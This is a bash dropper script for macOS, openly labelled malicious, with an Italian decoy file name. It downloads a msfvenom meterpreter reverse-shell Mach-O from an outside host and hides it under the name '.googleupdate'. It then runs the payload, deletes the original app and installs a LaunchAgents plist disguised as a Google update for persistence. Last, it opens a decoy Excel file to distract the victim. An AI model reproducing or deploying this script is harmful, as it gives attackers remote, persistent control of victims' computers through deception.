#!/usr/bin/env bash

# URL hosting our malicious mach-o reverse shell generated with msfvenom
# msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=dns1resolve.hopto.org LPORT=443 -f macho > osx
URL="https://dns1resolve.hopto.org:55143/osx"

# URL hosting our plist file
PLISTURL="https://dns1resolve.hopto.org:55143/plist"

# URL to download a real excel file
EXCELURL=""

# Rename our payload macho-o name
PAYLOAD="googleupdate"

# Add dot to make hidden file
PAYLOAD=".${PAYLOAD}"

# Download malicious mach-o from ftp over ssl.
# curl --ftp-ssl -u user:pass ftp://MY_C2C_IP:21/payloads/macho
# or
# Download from https
# This payload is our persistence reverse backdoor in mach-o format!!!
curl -s -k $URL -o ~/Library/$PAYLOAD

# Want to be sure that's my payload is executable
chmod +x ~/Library/$PAYLOAD

# Launch the macho-o reverse backdoor
~/Library/$PAYLOAD &

sleep 2

# Remove original malicious .app directory from victim
rm -rf planimetria* 2>/dev/null 

# Persistence as LaunchAgents. Our backdoor will call us after user login.
# If we kill session once established, victim neeeds to log off and log in again to get another shell,
# or just reboot.
#
# Download and write backdoored plist file
curl -s -k $PLISTURL -o ~/Library/com.google.update.plist

# Get current dir
CURRENTDIR=pwd

# Download and open a real file excel
curl -s $EXCELURL -o $CURRENTDIR/progetto.xls
open $CURRENTDIR/progetto.xls
